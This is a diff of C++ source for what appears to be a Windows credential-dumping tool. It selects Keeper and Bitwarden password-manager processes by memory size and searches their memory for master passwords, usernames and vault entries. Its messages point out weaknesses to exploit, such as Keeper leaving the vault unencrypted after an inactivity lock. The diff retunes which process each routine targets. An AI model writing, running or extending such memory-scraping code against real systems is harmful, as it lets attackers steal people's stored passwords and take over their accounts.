@@ -321,7 +321,7 @@ int checkApps() {
     if (userInput == "keeper") {
         std::cout << "User input matches 'keeper'.\n";
         std::cout << "In this app, the third largest process is needed.\n";
-        std::cout << "Only entries should be available.\n";
+        std::cout << "Master username, pass and entries should be available.\n";
         std::cout << "Also, by default the app does not encrypt the vault after locking the UI due to inactivity.\n";
         const char* processName = "keeperpasswordmanager.exe";
         std::vector<DWORD> pids;
@@ -335,8 +335,8 @@ int checkApps() {
                 // Step 2: Get Private Working Set sizes for the found PIDs
                 std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-                // Step 3: Find the PID with the third-largest Private Working Set size
-                DWORD thirdLargestPID = FindThirdPID(pidSizePairs);
+                // Step 3: Find the PID with the first-largest Private Working Set size
+                DWORD thirdLargestPID = FindFirstPID(pidSizePairs);
 
                 if (thirdLargestPID != 0)
                 {
@@ -394,8 +394,8 @@ int checkApps() {
                 // Step 2: Get Private Working Set sizes for the found PIDs
                 std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-                // Step 3: Find the PID with the second-largest Private Working Set size
-                DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+                // Step 3: Find the PID with the first-largest Private Working Set size
+                DWORD secondLargestPID = FindFirstPID(pidSizePairs);
 
                 if (secondLargestPID != 0)
                 {
@@ -1202,7 +1202,7 @@ int checkApps() {
         if (userInput2 == "1") {
 
             std::cout << "For this app, the first largest process is needed.\n";
-            std::cout << "The master password and username (email address) should be available.\n";
+            std::cout << "The master password and entries should be available.\n";
             std::cout << "It should be noted that the app clears master password from the memory after some time (appox. 10 min).\n";
             const char* processName = "Bitwarden.exe";
 
@@ -1218,8 +1218,8 @@ int checkApps() {
                     // Step 2: Get Private Working Set sizes for the found PIDs
                     std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-                    // Step 3: Find the PID with the first-largest Private Working Set size
-                    DWORD firstLargestPID = FindFirstPID(pidSizePairs);
+                    // Step 3: Find the PID with the second-largest Private Working Set size
+                    DWORD firstLargestPID = FindSecondPID(pidSizePairs);
 
                     if (firstLargestPID != 0)
                     {
@@ -1252,7 +1252,7 @@ int checkApps() {
             std::cout << "Searching for master password (1/2).\n";
             getCredsbitwardenApp1(fileInput);
             std::cout << "Done!\n";
-            std::cout << "Searching for master username (2/2).\n";
+            std::cout << "Searching for entry password (2/2).\n";
             getCredsbitwardenApp2(fileInput);
             std::cout << "Done!\n";
             std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
